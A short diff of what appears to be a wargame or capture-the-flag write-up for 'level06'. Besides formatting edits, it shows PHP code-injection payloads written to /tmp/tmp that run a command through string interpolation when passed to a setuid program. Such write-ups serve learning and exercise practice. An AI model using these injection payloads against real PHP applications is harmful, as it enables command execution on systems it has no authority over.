@@ -15,6 +15,8 @@ Login
    ^ rws → owner = r|w|x+s permissions
 ```
 
+<details><summary>See mode</summary>
+
 PHP
 
 ```b
@@ -37,13 +39,18 @@ print $r;
 ?>
 ```
 
+</details>
+
 `$a` should have this form `[x (.*)]`
 
 ```b
     Either one of
+
 echo '[x  ${`getflag`}]' > /tmp/tmp
 echo '[x  ${(exec(getflag))}]' > /tmp/tmp
 echo '[x {${system(getflag)}}]' > /tmp/tmp
+
     THEN
+
 ./level06 /tmp/tmp
 ```
